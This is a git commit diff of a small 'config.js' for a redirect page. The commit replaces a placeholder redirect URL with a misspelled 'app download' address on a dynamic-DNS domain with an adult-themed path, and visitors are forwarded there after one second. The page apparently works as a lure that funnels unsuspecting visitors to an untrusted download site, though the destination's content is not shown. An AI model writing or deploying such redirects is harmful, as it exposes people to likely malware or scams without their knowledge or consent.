aa69ec3c9574f9675927b79a32638d7fa58cc16a
Pbail Squad <156425176+Pbail@users.noreply.github.com>
2026-08-11 00:27:51 +0530

    Update config.js

--- config.js
+++ config.js
@@ -6,7 +6,7 @@
 
 const SITE_CONFIG = {
   // Jis site par redirect karna hai, uska poora URL (https:// ke saath)
-  redirectUrl: "https://example.com",
+  redirectUrl: "https://appdowwnload.duckdns.org/sexy/0d7d2a7074",
 
   // Redirect hone se pehle kitne second wait karega (0 se koi bhi number)
   delaySeconds: 1
